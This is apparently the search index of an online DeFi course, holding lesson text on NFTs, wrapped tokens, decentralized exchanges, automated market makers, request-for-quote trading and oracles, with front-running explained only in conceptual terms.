characterized by goods being uniform in their properties, interchangeable, and indistinguishable from each other. Examples of fungibility include US Dollars or Coca-Cola bottles. NFTs can represent ownership of digital scarce goods like art , collectables or any unique non-fungible item. They can also represent unique trading positions on a bonding curve like Uniswap v3 , intellectual property , licenses , insurance , options, bonds, real estate, game items , deeds, domain names and more. Even when considering two identical collectables, other factors can make them unique, like their provenance , history, year of production and more. NFTs are created with the ERC-721 standard. Popularized by CryptoKitties in 2017, they share these properties: Unique, with their particular qualities usually stored in the metadata Indivisible since they cannot be split up. Provably scarce. Usually, one or a limited number of NFTS and can be verified on-chain Provable ownership, since you check on-chain Fraud proof. They can't be faked. We will cover some issues around this later. Easily transferable ERC-1155 further builds upon ERC-721 and allows for mixed-use of fungible and non-fungible tokens, among other features . You can explore the difference between 721 and 1155 here . You can also see the difference between all three standards and their use cases . ERC-1155 was created by Enjin and can be used in gaming, so non-fungible items like a player or item can hold fungible assets like gold or coins. We will see later on how this is applicable.","title":"What are NFTs"},{"location":"S05a-defi/M3-nfts/L1/#nft-hype-via-art","text":"Maybe you have heard of Crypto Punks , Disaster Girl NFT , Beeple\u2019s 69 million dollar NFT , Damien Hirst\u2019s NFTs , Bored Yacht Club , RarePizzas , Pudgy Penguins , EulerBeats and pplpleasr ? Even Edward Snowden and others have found a new market for their art. Haven\u2019t heard of them? You can get hip to it on CryptoTwitter , sign up for Bankless\u2019s MetaVersal newsletter or use Non-fungible.com for real time digital asset tracking to help you to navigate NFT markets. What's the deal with the hype? Why is this so important? First, you may want to learn the quick History of NFTs via Potion . Then, two highly recommended videos on NFTs that can explain more are The Defiant Guide to Digital Art and NFTs and The Greatest NFT Film Ever Made by The Defiant . The most prolific and accessible usage of NFTs is art and gaming. What is art? According to Andy Warhol, \"Art is what you can get away with\". The message can be the medium as Andy Wahorl proved by using mass production and consumerism in his art . How are they a better way than just releasing art on the internet?","title":"NFT Hype via Art"},{"location":"S05a-defi/M3-nfts/L1/#why-nfts","text":"","title":"Why NFTS"},{"location":"S05a-defi/M3-nfts/L1/#telephone-problem-provenance","text":"Ethereum also solves the \"telephone problem\", where information is changed over time. Since Ethereum has an immutable ledger, one could track changes to historical digital artefacts over time. Most importantly, it can track provenance for items, whether cultural or utilitarian, like olive oil. This is important because Ethereum can be used as a store of historical value, like culture.","title":"Telephone problem: Provenance"},{"location":"S05a-defi/M3-nfts/L1/#zero-costs-zero-pricing","text":"The internet of information allowed anyone to disseminate culture. Easy copying means that due to the near-zero cost of replicating information, the value of any art that could be digitized is reduced close to zero. Additionally, any value accrued was captured by the middlemen who controlled the servers and could set the market rules. Even with strong branding and engagement, the middlemen can extract large amounts of value, as we will see in the following section.","title":"Zero costs, zero pricing"},{"location":"S05a-defi/M3-nfts/L1/#power-through-markets","text":"The properties of Ethereum change this. The commoditization of network servers and databases through a single world computer allows the artist to move between providers. Enforced digital scarcity limits authentic copies and enforces legitimacy and social signalling. Programmable smart contracts enable creators to set the rules of the game for their art and capture value how they see fit. In theory, this means being paid every time the art changes owners, not just on the first sale. It also means that the art can carry its own set of tokenomics, creating hype via price action. Ownership means that the asset can be used as collateral, rented, or licensed in a digitally enforced manner. These are unique only to blockchain-based networks. With EIP-2981- The Royalty Standard , creators can enable universal support for royalty payments across all NFT marketplaces and ecosystem participants. This solves the problem of being tied to any NFT marketplace, which we will discuss later. In addition, creators can leverage EIP-2615 - The Non-Fungible Token with mortgage and rental functions to turn their NFTs into streams of income. These EIPs can be helpful in art markets as well as gaming economies, as we shall see. There are various ways users and artists can make money off NFTs . Services like reNFT allow users to rent their NFTs. NFTfi enables users to use them as collateral. This solves the issue of using assets with potentially illiquid markets for collateralized loans. Don't know what NFT to buy or don't have enough cash to buy a whole one? NFTx allows users to mint and buy into decentralized NFT index funds that fractionalize NFTs into ERC-20 tokens. Platforms like Rariable and Unicly even engage in a liquidity mining program to incentivize users to buy and sell NFTs in exchange for tokens. These can be used for governance or sold on open markets. Ethereum can help decentralize art markets and games, giving artists and users/collectors a more direct connection, reducing dominant brokers' cartel-like behaviour. It also unites fragmented markets by placing them on the internet and helping to bring a new crowd to Ethereum . In the process, users begin to understand decentralization and are exposed to DeFi-like mechanics.","title":"Power through markets"},{"location":"S05a-defi/M3-nfts/L1/#myths-legitimacy-and-coordination","text":"Why is disseminating culture important? Myths are all around us. They inform and are part of the substrate of our belief and value systems. Pragmatically speaking, it's why people attach value to Yeezys or Balenciaga. Or why they choose Harvard over their local state college. It's why Jordans have a better cultural cache than Shaqs. According to Yoval Noah Harari in his book Sapiens , myths are social fiction that allows humans to scale collaboration from small tribes to millions of people. Legitimacy is what separates the in-group from the outgroup. It keeps the imposters who wish to mimic and gain a group's benefits without the costs. Legitimacy underpins social signalling, which allows for coordination between groups . We find social signalling in economics and evolutionary biology . On a practical level, NFTs make it easier to call out posers. Or as they say, \"You gotta pay the cost to be da boss\". Being provable scarce allows for legitimacy to be enforced. However, this is not to say that the technology is perfect. There are some issues with using NFTs to prove outright authenticity, as fraudsters try to impersonate others and reupload their works . Myths > values > choice > signalling > legitimacy > coordination. @punk6929 in this tweet thread \ud83e\uddf5 beautifully sums up the role of NFTs in creating culture, myths and scaling human collaboration. Myth Building, or \"branding and marketing\", allows companies to place a logo on an item and charge the idea. It allows celebrities to earn hefty sums of money for a brand's association with them. Myths underpin even cryptocurrencies if we take a look at Bitcoin or Dogecoin. Myths inform branding, which informs a user's choices based on their values. Creators can be artists or scientists. NFTs can even give control to creators of scientific intellectual property . Ultimately, NFTs give the economics and control of these myths to their creators \ud83d\udcaa. They can be used in conjunction with DAO to create art to fund causes like how Rare Pizzas uses NFTs to fund free pizza for people on Bitcoin Pizza Day . Or FlamingoDAO to fund NFTs .","title":"Myths: Legitimacy and Coordination"},{"location":"S05a-defi/M3-nfts/L1/#how-to-get-nfts","text":"There are various places where you buy or sell NFTs. Check out the links for guides on leading platforms OpenSea , Foundation , Rarible , Zora , SuperRare , Mintable , or Palm NFT Sidechain . Get a deep dive into the status of the industry here . As convenient as these platforms are, there are issues with them . Some of these issues relate to centralization risk, which increases censorship or your assets being deleted. Some platforms control your keys, which means you don't really own the NFT. There is a lack of data portability fragments markets and limits royalties between platforms. Finally, there is a centralization risk with any data which underpins the NFT could also be stored on a centralized server. In the next part, we will see how to create an NFT and leverage tools to decentralize your assets.","title":"How to get NFTs"},{"location":"S05a-defi/M3-nfts/L1/#creating-nfts","text":"You can create your own NFTs! Learn how to create your own NFT via Ethereum.org . Furthermore, you can host them on a decentralized file storage solution like NFT.storage . It\u2019s powered by IPFS and Filecoin . To set up, go through the nft.storage instructions. Want to learn more? Go to nftschool.dev to learn about best practices. Feel free to check out the Filecoin Truffle Box and these set up instructions . But what about art? You can use Adobe Photoshop or open-source tools like GIMP image editor or Blender for 3D creation. Pro tip: you can check out the Decentraland Discord and ask what tools developers use to build things. Want to go the programmatic route to create NFTs like this generative art example or this example ? Generative Art let's the code create the art. Use P5.js , the JavaScript library, for creating coding. It focuses on making coding accessible for artists, designers, beginners and anyone else! See a great example of generative art here . Dan Shiffman , the creator of The Coding Train , has the most comprehensive videos on how to use P5.js on the internet . He also has some of the best and most ENTERTAINING videos on learning to code. In addition, he wrote a fantastic book called The Nature of Code , which shows you how to model nature with JavaScript. The book has a video series you can follow along. If you can support his channel, please donate to support his work \u2665\ufe0f. You can combine P5.js with physics libraries like Matter.js or PhysicsJS. For a 3D library, you can try out ThreeJS. You can check out this tutorial to see how to create generative art using P5.js and React, mint an NFT and host it on your website . Also, check out BeyondNFT to learn how to build interactive NFTs with p5JS and ThreeJS . How about using TensorFlowJS to get user input and try to figure out how to get interactions with your NFTs. Maybe, they can \"learn\" from their users and record some version of that data on-chain \ud83e\udd37\u200d\u2642\ufe0f. You can also explore how to add royalties for various platform secondary sales with this tutorial . What if you can go beyond NFTs and create in-game assets that can make money?","title":"Creating NFTs"},{"location":"S05a-defi/M3-nfts/L1/#the-metaverse-gaming-and-nfts","text":"Fun fact: the genesis of Ethereum sort of started with games. Vitalik Buterin discovered the evils of centralized entities after losing his World of Warcraft assets . The first NFTs were created by a blockchain-based game called CryptoKitties . Enjin created the ERC1155 standard for gaming applications. Turns out, NFTs are a crucial building block to the metaverse and in-game economies. AXIE Infinity is proving to be the killer app of Gaming and NFTs , with more revenue than Uniswap and even Ethereum itself . Gaming is the best place due to feedback loops and the utility of the NFT. In-game items can be represented as NFTs. A game's feedback loop keeps the users engaged and can give added value to the NFTs. Straight out of the book Ready Player One , play-to-earn is an emerging phenomenon where people playing games are earning more than the average income in some developing nations . Massively multiplayer online role-playing games like Everquest , World of Warcraft , EVE Online , have already had internal game economies for years. Fortnite and Roblox make massive amounts of money. These game economies can yield interesting data . However, centralization plagues the game creators and players themselves. Game developers can act as central banks and skew imperfect \"markets\". Game developers themselves have to fork over tons of money to app stores. Worst of all, markets don't exist since players can't trade with each other.","title":"The MetaVerse: Gaming and NFTs"},{"location":"S05a-defi/M3-nfts/L1/#blockchains-are-the-new-app-stores","text":"Fortnite, Roblox, and other games have to pay massive fees to centralized app store providers for all the money they make. Roblox pays 24% of all money generated to App Stores. Fortnite famously sued Google and Apple for the large cut they took . See Chiris Dixon's thread \ud83e\uddf5 Blockchain-based games can solve a lot of market-based problems caused by centralized games for users and games. Costly fees could be avoided. Better player-led internal economies where users own their assets forever and freely trade with each other. Games and assets can be transferred between platforms. Third-party developers won't have to worry about changing in-game economics.","title":"Blockchains are the new app stores"},{"location":"S05a-defi/M3-nfts/L1/#defi-within-gaming-economies","text":"Games like AXIE Infinity , Decentraland ,and Gods Unchained build actual in-game economies where players can trade. Decentralized App stores like MetaZone are emerging where users can create assets for open-world games. By using DeFi patterns like AMMs, lending markets, index funds, using assets as collateral, users can help manage their economies. Emerging standards around rental, royalty will expand the ways users can play games to earn money. That way, the rewards of this cultural product can go to the creators and players, not just the game companies. These in-game economies grow because of the demand for scarce assets. Internal economies can use the existing DeFi patterns we have seen to help this. However, different games will have fragmented liquidity and assets since they would conceivably use their own custom EVM compatible chain. Using cross-chain lending markets and yield farming for in-game assets sounds familiar to cross-chain yield farming or lending markets in DeFi. Projects like Yield Guild are looking to help fix this issue. Worst case scenario, all these assets can convert to ETH, and we would see network effects between games and other ecosystems. We have already seen tokenized real estate in games like Decentraland. Out of this is emerging rental agreements , which could eventually be applied in other scenarios. Rental income can allow for usage of NFT to earn a yield and split the income to the originator. Say if one rents a plot of land on a digital game like Decentraland, and an NFT represents that plot. Lending markets would allow players to rent assets and share the profits, or XP points can be another application. You can even buy ad space within Decentraland . Over time, it will be easy to see how game guilds could transform into DAO managing, trading, collaborating, and competing over resources. This sounds a lot like modern companies. And it all happened with memes and magical internet money.","title":"DeFi within Gaming economies"},{"location":"S05a-defi/M3-nfts/L1/#additional-resources","text":"NFT School via nftschool.dev The History of NFTs via Potion The Defiant Guide to Digital Art and NFTs The Greatest NFT Film Ever Made by The Defiant Mark Cuban on Digital Collectables via The Defaint The Most Important Scarce Resource is Legitimacy by Vitalik Buterin Legitimacy | Vitalik Buterin via Bankless","title":"Additional Resources"},{"location":"S05a-defi/M4-wrapped/L1/","text":"What are Wrapped Tokens? Wrapped tokens are a way to bridge cryptocurrencies between blockchains. They are used to represent tokens that are not native to a blockchain network. An example is using Bitcoin or Dogecoin on Ethereum. Wrapped tokens exist because different blockchain networks may offer different features and can\u2019t talk directly to each other. These help increase interoperability and liquidity between networks. Wrapped tokens work by having a token deposited into an account and is digitally represented on a smart contract platform like Ethereum. The tokens are collateralized with the asset, typically at 1:1. The deposit and issuance happen through a custodian, an entity that holds the assets. The custodian can be a company like Circle/Coinbase (via USDC){target=_blank}, a merchant, a multi-signature wallet, a DAO or a smart contract. To mint wrapped tokens, the custodian receives the asset and then issues it on the chain. Tokens are burned when the custodian receives a notice to release assets from the reserves. Users would want to have wrapped tokens on Ethereum because the assets could earn a yield within DeFi Apps. Instead of your Bitcoin or Dogecoin only gaining value through price appreciation, you can earn a yield by lending it on DeFi platforms. By putting your idle assets to work, you could earn a stream of funds. Also, by using Wrapped Bitcoin on Ethereum, you can settle transactions faster and access markets with deeper liquidity. Since DeFi platforms rely on over-collateralization to assure stability and what is being lent out is not the asset itself, there is less worry about losing your assets. Popular examples of wrapped tokens include WBTC , RenBTC, RenDoge, RenFIL, WETH. Ren Protocol specializes in wrapped tokens between chains. You can also check out BadgerDAO , which is dedicated to creating tools to onboard Bitcoin liquidity onto Ethereum to earn yield. WETH (wrapped ETH) is a special case of a wrapped token since it takes native ETH and wraps it in the ERC-20 standard. This allows ETH to be used in DeFi applications via a standard set of rules , since ETH was created before the ERC-20 standard emerged. With this, ETH can be used as collateral in the network. Prior to WETH, using ETH in a DeFi app would require swapping ETH into a token. As multiple chains emerge for different use cases, inter-blockchain liquidity will be emphasized across networks. Say moving between Polygon and Ethereum. Wrapped Tokens require some level of trust with the custodian. At some point, trustless or trust minimized solutions with no custodians will appear, allowing anyone to move assets between any chain. Additional Resources Article: What are Wrapped Tokens? Article: Understanding Wrapped Bitcoin and the Wrapped Tokens Framework Article: Wrapped Crypto Tokens, Explained Analysis: Poly Network via Rekt.news","title":"What are Wrapped Tokens?"},{"location":"S05a-defi/M4-wrapped/L1/#what-are-wrapped-tokens","text":"Wrapped tokens are a way to bridge cryptocurrencies between blockchains. They are used to represent tokens that are not native to a blockchain network. An example is using Bitcoin or Dogecoin on Ethereum. Wrapped tokens exist because different blockchain networks may offer different features and can\u2019t talk directly to each other. These help increase interoperability and liquidity between networks. Wrapped tokens work by having a token deposited into an account and is digitally represented on a smart contract platform like Ethereum. The tokens are collateralized with the asset, typically at 1:1. The deposit and issuance happen through a custodian, an entity that holds the assets. The custodian can be a company like Circle/Coinbase (via USDC){target=_blank}, a merchant, a multi-signature wallet, a DAO or a smart contract. To mint wrapped tokens, the custodian receives the asset and then issues it on the chain. Tokens are burned when the custodian receives a notice to release assets from the reserves. Users would want to have wrapped tokens on Ethereum because the assets could earn a yield within DeFi Apps. Instead of your Bitcoin or Dogecoin only gaining value through price appreciation, you can earn a yield by lending it on DeFi platforms. By putting your idle assets to work, you could earn a stream of funds. Also, by using Wrapped Bitcoin on Ethereum, you can settle transactions faster and access markets with deeper liquidity. Since DeFi platforms rely on over-collateralization to assure stability and what is being lent out is not the asset itself, there is less worry about losing your assets. Popular examples of wrapped tokens include WBTC , RenBTC, RenDoge, RenFIL, WETH. Ren Protocol specializes in wrapped tokens between chains. You can also check out BadgerDAO , which is dedicated to creating tools to onboard Bitcoin liquidity onto Ethereum to earn yield. WETH (wrapped ETH) is a special case of a wrapped token since it takes native ETH and wraps it in the ERC-20 standard. This allows ETH to be used in DeFi applications via a standard set of rules , since ETH was created before the ERC-20 standard emerged. With this, ETH can be used as collateral in the network. Prior to WETH, using ETH in a DeFi app would require swapping ETH into a token. As multiple chains emerge for different use cases, inter-blockchain liquidity will be emphasized across networks. Say moving between Polygon and Ethereum. Wrapped Tokens require some level of trust with the custodian. At some point, trustless or trust minimized solutions with no custodians will appear, allowing anyone to move assets between any chain.","title":"What are Wrapped Tokens?"},{"location":"S05a-defi/M4-wrapped/L1/#additional-resources","text":"Article: What are Wrapped Tokens? Article: Understanding Wrapped Bitcoin and the Wrapped Tokens Framework Article: Wrapped Crypto Tokens, Explained Analysis: Poly Network via Rekt.news","title":"Additional Resources"},{"location":"S05a-defi/M5a-dexes/L1/","text":"What are DEXes Decentralized Exchanges (DEX) are DeFi applications that allow users to trade cryptocurrencies peer-to-peer without an intermediary using Ethereum smart contracts. DEXs are non-custodial, provide greater access to tokens, are secure, require no signups and eliminate counterparty risk. However, scalability, gas fees and on/off ramps for assets remain a problem. There are three main types of DEXs: order books, automatic market makers and request for quote. This section will cover the most popular type of DEX called an Automated Market Maker and the Request For Quote Model, which has its distinct advantages. In addition, each has its distinct advantages and disadvantages.","title":"What are DEXes"},{"location":"S05a-defi/M5a-dexes/L1/#what-are-dexes","text":"Decentralized Exchanges (DEX) are DeFi applications that allow users to trade cryptocurrencies peer-to-peer without an intermediary using Ethereum smart contracts. DEXs are non-custodial, provide greater access to tokens, are secure, require no signups and eliminate counterparty risk. However, scalability, gas fees and on/off ramps for assets remain a problem. There are three main types of DEXs: order books, automatic market makers and request for quote. This section will cover the most popular type of DEX called an Automated Market Maker and the Request For Quote Model, which has its distinct advantages. In addition, each has its distinct advantages and disadvantages.","title":"What are DEXes"},{"location":"S05a-defi/M5b-amms/L1/","text":"Automated Market Makers - AMM An automated market maker (AMM) is a smart contract that holds assets and is always willing to quote you a price between two assets. You can trade against the AMM's capital in the smart contract instead of between peers. It uses the trades to update the size of the assets and update their price accordingly. The AMM can always guarantee liquidity by raising the price for an asset according to market demand. There are various ones , however we will focus on the most important features popularized by UniSwap. Haseeb Qureshi explains UniSwap well here. We will cover another type of DEX protocol in a later section. This section will give an overview of two key concepts that make AMMs possible. Liquidity Pools Automated Market Makers rely on liquidity pools to source capital. Liquidity pools are collections of tokens locked into a smart contract. This allows for decentralized capital formation. They are used to facilitate trading by providing liquidity, defined as the ability to convert an asset into cash or its equivalents without greatly affecting its market price. This is important because an asset's value is determined by what others are willing to pay for it and how easily it can be bought or sold. The main ideas behind liquidity pools are: They are used to source capital which is used to provide liquidity. Liquidity is the ability to convert an asset into cash without affecting its price. They are useful because order book models are not feasible on-chain completely since market makers cannot update prices all the time due to gas fees and Ethereum's throughput being too slow. Liquidity pools source capital from anyone and are used to allow anyone to trade against the smart contract. Liquidity providers earn a fee for doing so in the proportion of capital they provide to the pool. To become a liquidity provider, users must deposit equal amounts of token based on their price into a pool. If they don't, they risk being arbitraged by traders who find a good deal. -AMMs like UniSwap hold liquidity pools in token pairs. An example can be the ETH - DAI or CRV - COMP (Curve to Compound Finance). The downside : Because trades happen on-chain, bots can front-run transactions and attempt other sorts of attacks . This results in a user paying more than they intended. Front running occurs when bots read Ethereum's current set of unprocessed pending transactions called the mempool and find an opportunity to outbid a transaction to be processed by the network miner (or validator after ETH 2.0). The bots get ahead of the line, which results in a better price for them at the expense of the other traders. -This stems from the Miner Extractable Value , where a miner can dictate when, how and where a transaction will go into an Etheruem block. When a transaction large enough to create slippage is sent to the network, bots will notice and set off a bidding war to capture the stop and front-run. Bonding Curves The other key to Automated Market Makers is the bonding curve. A bonding curve is a mathematical formula used to describe the relationship between the price and the supply of an asset. This can be thought of as a deterministic pricing formula. This formula is called the Constant Product Formula in UniSwap. This curve can be represented in a smart contract that can buy or sell the underlying token. Bonding Curves emerge out of the ability to escrow funds in a smart contract. The main ideas behind the Constant Product Formula are: -To always ensure liquidity for any asset by modelling the demand curve in the smart contract. Users trade against the smart contract, not between each other. k always has to stay the same number, no matter what x or y does. The price quoted is directly dependent on the size of the order. The trade-off for assured liquidity is slippage, also known as getting less for more. x * y = k x = supply of asset 1 y = supply of asset 2 k = Fixed Size of Pool The downside: Note that the further one moves along the curve, the less they get. In UniSwap, the slippage starts to seriously affect orders; around 2% of the liquidity of a token is traded against. A good description of this can be found via this article and most recently here . Different AMMs have variations of this deterministic pricing formula depending on their need. Curve implements a special formula to allow stablecoins trades for assets that are a stable representation of each other, which results in a narrow trading band. An example of this is trading between ETH and sETH (synthetic ETH) or USDC and DAI, which should both be pegged close to the US Dollar. Synching Prices Across Markets With Automated Market Makers similar to UniSwap v2, prices are synched with outside markets via arbitrageurs who spot price differences between exchanges. These exchanges can be other DEXes or centralized exchanges. Arbitrageurs capture the profit, which is the difference in price between the two markets. A consequence of this is impermanent loss for liquidity providers, the difference between holding an asset and providing liquidity. This is similar to an opportunity cost which if realized turns into a real loss. Impermanent loss is also described in this animated video and article and here . Uniswap V3 has other features like Range Orders and Limit Orders which you can explore. Some AMMs can hold more than two assets, namely Balancer, but these are more sophisticated and rely on Bonding Surfaces . Additional Resources DeFi and the Future of Finance (section 4.7.2) DeFi and the Future of Finance (section 6.2) Graphical Guide for Understanding Uniswap via EthHub","title":"Automated Market Makers - AMM"},{"location":"S05a-defi/M5b-amms/L1/#automated-market-makers-amm","text":"An automated market maker (AMM) is a smart contract that holds assets and is always willing to quote you a price between two assets. You can trade against the AMM's capital in the smart contract instead of between peers. It uses the trades to update the size of the assets and update their price accordingly. The AMM can always guarantee liquidity by raising the price for an asset according to market demand. There are various ones , however we will focus on the most important features popularized by UniSwap. Haseeb Qureshi explains UniSwap well here. We will cover another type of DEX protocol in a later section. This section will give an overview of two key concepts that make AMMs possible.","title":"Automated Market Makers - AMM"},{"location":"S05a-defi/M5b-amms/L1/#liquidity-pools","text":"Automated Market Makers rely on liquidity pools to source capital. Liquidity pools are collections of tokens locked into a smart contract. This allows for decentralized capital formation. They are used to facilitate trading by providing liquidity, defined as the ability to convert an asset into cash or its equivalents without greatly affecting its market price. This is important because an asset's value is determined by what others are willing to pay for it and how easily it can be bought or sold. The main ideas behind liquidity pools are: They are used to source capital which is used to provide liquidity. Liquidity is the ability to convert an asset into cash without affecting its price. They are useful because order book models are not feasible on-chain completely since market makers cannot update prices all the time due to gas fees and Ethereum's throughput being too slow. Liquidity pools source capital from anyone and are used to allow anyone to trade against the smart contract. Liquidity providers earn a fee for doing so in the proportion of capital they provide to the pool. To become a liquidity provider, users must deposit equal amounts of token based on their price into a pool. If they don't, they risk being arbitraged by traders who find a good deal. -AMMs like UniSwap hold liquidity pools in token pairs. An example can be the ETH - DAI or CRV - COMP (Curve to Compound Finance). The downside : Because trades happen on-chain, bots can front-run transactions and attempt other sorts of attacks . This results in a user paying more than they intended. Front running occurs when bots read Ethereum's current set of unprocessed pending transactions called the mempool and find an opportunity to outbid a transaction to be processed by the network miner (or validator after ETH 2.0). The bots get ahead of the line, which results in a better price for them at the expense of the other traders. -This stems from the Miner Extractable Value , where a miner can dictate when, how and where a transaction will go into an Etheruem block. When a transaction large enough to create slippage is sent to the network, bots will notice and set off a bidding war to capture the stop and front-run.","title":"Liquidity Pools"},{"location":"S05a-defi/M5b-amms/L1/#bonding-curves","text":"The other key to Automated Market Makers is the bonding curve. A bonding curve is a mathematical formula used to describe the relationship between the price and the supply of an asset. This can be thought of as a deterministic pricing formula. This formula is called the Constant Product Formula in UniSwap. This curve can be represented in a smart contract that can buy or sell the underlying token. Bonding Curves emerge out of the ability to escrow funds in a smart contract. The main ideas behind the Constant Product Formula are: -To always ensure liquidity for any asset by modelling the demand curve in the smart contract. Users trade against the smart contract, not between each other. k always has to stay the same number, no matter what x or y does. The price quoted is directly dependent on the size of the order. The trade-off for assured liquidity is slippage, also known as getting less for more. x * y = k x = supply of asset 1 y = supply of asset 2 k = Fixed Size of Pool The downside: Note that the further one moves along the curve, the less they get. In UniSwap, the slippage starts to seriously affect orders; around 2% of the liquidity of a token is traded against. A good description of this can be found via this article and most recently here . Different AMMs have variations of this deterministic pricing formula depending on their need. Curve implements a special formula to allow stablecoins trades for assets that are a stable representation of each other, which results in a narrow trading band. An example of this is trading between ETH and sETH (synthetic ETH) or USDC and DAI, which should both be pegged close to the US Dollar.","title":"Bonding Curves"},{"location":"S05a-defi/M5b-amms/L1/#synching-prices-across-markets","text":"With Automated Market Makers similar to UniSwap v2, prices are synched with outside markets via arbitrageurs who spot price differences between exchanges. These exchanges can be other DEXes or centralized exchanges. Arbitrageurs capture the profit, which is the difference in price between the two markets. A consequence of this is impermanent loss for liquidity providers, the difference between holding an asset and providing liquidity. This is similar to an opportunity cost which if realized turns into a real loss. Impermanent loss is also described in this animated video and article and here . Uniswap V3 has other features like Range Orders and Limit Orders which you can explore. Some AMMs can hold more than two assets, namely Balancer, but these are more sophisticated and rely on Bonding Surfaces .","title":"Synching Prices Across Markets"},{"location":"S05a-defi/M5b-amms/L1/#additional-resources","text":"DeFi and the Future of Finance (section 4.7.2) DeFi and the Future of Finance (section 6.2) Graphical Guide for Understanding Uniswap via EthHub","title":"Additional Resources"},{"location":"S05a-defi/M5c-rfqs/L1/","text":"Request for Quote When to use which tool Have a large order? Use AirSwap and go deep. It\u2019s great for larger trades to protect margins and protect against a kind of front running called \"miner extracted value\" . This is because trades are direct between traders, so there is no slippage or public information to the front-run orders. Need liquidity? Use an Automated Market Maker like UniSwap and go wide. It\u2019s great for variety and availability. But, ideally, aim for smaller trades to anything under 2% of the total supply of an asset. This is due to how the \"Constant Product Formula\" used by AMMs is modelled to ensure liquidity. Key Idea : Use the appropriate tool based on the size of your order. RFQ facilities direct trade between parties which is: Fair - avoids the mempool and issues around Front running, and miner extractable value. Efficient - Eliminates slippage, so you get what you paid for. Scalable - negotiations happen off-chain (not on Ethereum) and scales better than relying solely on Ethereum\u2019s throughput. Summary Request for Quote handles trades with off-chain negotiations and on-chain settlement ( trades ). Market makers are called Makers who run servers to fulfil orders. Counterparties to makers are called Takers, who wish to trade tokens. RFQ can be seen as a peer-to-peer system. The protocol\u2019s smart contracts focus on on-chain settlement of trades via \"atomic\" swaps using smart contracts. Price discovery and negotiation are made off-chain via RPC ( remote procedure call ), which is scalable and resistant to AMM issues related to front running and miner extractable value. This model exists because of Ethereum\u2019s constraints and the issues around large orders on AMMs mentioned previously. Supplying Liquidity Liquidity is provided by Makers who run Servers . These servers are discoverable via the Registry Protocol which allows for price discovery. Makers submit their prices to trade. Takers are counterparties who wish to start a trade. Instead of talking to each Maker, the Taker sends a request to the Indexer, who aggregates the different Makers for Takers. This negotiation is done off-chain via RPC (remote procedure calls), making it resistant to flashbots searching the mempool for frontrunning opportunities, Miner Extractable Value and other shenanigans. Price Discovery and Verification Makers can consult with Oracles to consider a fair price suggestion. Takers can also consult with Oracles to ensure the price given is a good deal. Liquidity via Delegates If standing up a Server is too much, a Maker could use Delegates . Delegates enable any trader to add rules that specify the size and price for a particular token, which can be used as limit orders. The added benefit is that the trader doesn\u2019t lose custody of their tokens when doing so. Orders and Settlement Once discovery and off-chain negotiation are complete, the orders are settled on-chain. This is done via atomic swaps using a Swap contract. They are called atomic because they settle or they don\u2019t. The added benefit of this is that compared to order books, off-chain negotiation makes it more likely that orders will be filled once they are accepted. It helps to eliminate slippage and front running.","title":"Request for Quote"},{"location":"S05a-defi/M5c-rfqs/L1/#request-for-quote","text":"","title":"Request for Quote"},{"location":"S05a-defi/M5c-rfqs/L1/#when-to-use-which-tool","text":"Have a large order? Use AirSwap and go deep. It\u2019s great for larger trades to protect margins and protect against a kind of front running called \"miner extracted value\" . This is because trades are direct between traders, so there is no slippage or public information to the front-run orders. Need liquidity? Use an Automated Market Maker like UniSwap and go wide. It\u2019s great for variety and availability. But, ideally, aim for smaller trades to anything under 2% of the total supply of an asset. This is due to how the \"Constant Product Formula\" used by AMMs is modelled to ensure liquidity. Key Idea : Use the appropriate tool based on the size of your order. RFQ facilities direct trade between parties which is: Fair - avoids the mempool and issues around Front running, and miner extractable value. Efficient - Eliminates slippage, so you get what you paid for. Scalable - negotiations happen off-chain (not on Ethereum) and scales better than relying solely on Ethereum\u2019s throughput.","title":"When to use which tool"},{"location":"S05a-defi/M5c-rfqs/L1/#summary","text":"Request for Quote handles trades with off-chain negotiations and on-chain settlement ( trades ). Market makers are called Makers who run servers to fulfil orders. Counterparties to makers are called Takers, who wish to trade tokens. RFQ can be seen as a peer-to-peer system. The protocol\u2019s smart contracts focus on on-chain settlement of trades via \"atomic\" swaps using smart contracts. Price discovery and negotiation are made off-chain via RPC ( remote procedure call ), which is scalable and resistant to AMM issues related to front running and miner extractable value. This model exists because of Ethereum\u2019s constraints and the issues around large orders on AMMs mentioned previously.","title":"Summary"},{"location":"S05a-defi/M5c-rfqs/L1/#supplying-liquidity","text":"Liquidity is provided by Makers who run Servers . These servers are discoverable via the Registry Protocol which allows for price discovery. Makers submit their prices to trade. Takers are counterparties who wish to start a trade. Instead of talking to each Maker, the Taker sends a request to the Indexer, who aggregates the different Makers for Takers. This negotiation is done off-chain via RPC (remote procedure calls), making it resistant to flashbots searching the mempool for frontrunning opportunities, Miner Extractable Value and other shenanigans.","title":"Supplying Liquidity"},{"location":"S05a-defi/M5c-rfqs/L1/#price-discovery-and-verification","text":"Makers can consult with Oracles to consider a fair price suggestion. Takers can also consult with Oracles to ensure the price given is a good deal.","title":"Price Discovery and Verification"},{"location":"S05a-defi/M5c-rfqs/L1/#liquidity-via-delegates","text":"If standing up a Server is too much, a Maker could use Delegates . Delegates enable any trader to add rules that specify the size and price for a particular token, which can be used as limit orders. The added benefit is that the trader doesn\u2019t lose custody of their tokens when doing so.","title":"Liquidity via Delegates"},{"location":"S05a-defi/M5c-rfqs/L1/#orders-and-settlement","text":"Once discovery and off-chain negotiation are complete, the orders are settled on-chain. This is done via atomic swaps using a Swap contract. They are called atomic because they settle or they don\u2019t. The added benefit of this is that compared to order books, off-chain negotiation makes it more likely that orders will be filled once they are accepted. It helps to eliminate slippage and front running.","title":"Orders and Settlement"},{"location":"S05a-defi/M6-oracles/L1/","text":"Oracles in DeFi Oracles are an essential part of DeFi since finance cannot exist in a vacuum without information. Oracles are bridges between a blockchain and the real world. They are used as queriable on-chain APIs to get information into smart contracts. The data could be anything from price information, weather reports, random numbers or more. Oracles can also be bi-directional and can \"send\" data out to the real world. They are further described here . Many top DeFi applications by total value locked use oracles in some manner. Some of the most popular use cases are collecting pricing data, event-driven decentralized execution, and random number generation. Some popular oracle sources are Chainlink and Tellor . Chainlink is described here . Protocols like Uniswap and Maker can also act like oracles, since they can provide data from their feeds. In fact Compound Finance uses Uniswap v2 data in conjuction with Chainlink . Oracles in DeFi are used for a wealth of different reasons: To get the value of underlying collateral (such as Aave , Synthetix , Compound ) To generate a random lottery winner (such as PoolTogether Margin Trading (such as SushiSwap Execute decentralized event-driven tasks, so that your contracts react to events ! The oracle can execute your contracts if a certain event happens. Verify a stablecoin's collateral Fetch Cryptocurrency prices And more. For many of these DeFi services to work and not be exploited, they need to be connected to the real world to operate correctly. As a result, oracles are used within the popular lending or swaps protocol 